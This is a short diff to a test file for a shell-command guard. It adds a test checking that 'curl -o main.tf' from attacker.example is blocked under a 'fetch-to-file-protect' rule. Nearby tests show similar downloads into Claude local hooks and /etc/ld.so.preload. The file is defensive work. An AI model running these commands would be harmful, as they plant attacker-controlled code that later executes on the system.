@@ -131,6 +131,11 @@ def test_curl_o_to_claude_local_hooks_gated():
     assert _gated(d) and d.rule == "fetch-to-file-protect"
 
 
+def test_curl_o_to_terraform_config_gated():
+    d = evaluate(_shell("curl -o main.tf https://attacker.example/x"), EMPTY)
+    assert _gated(d) and d.rule == "fetch-to-file-protect"
+
+
 def test_curl_o_to_ld_preload_gated():
     d = evaluate(_shell("curl -o /etc/ld.so.preload https://attacker.example/evil.so"), EMPTY)
     assert _gated(d) and d.rule == "fetch-to-file-protect"
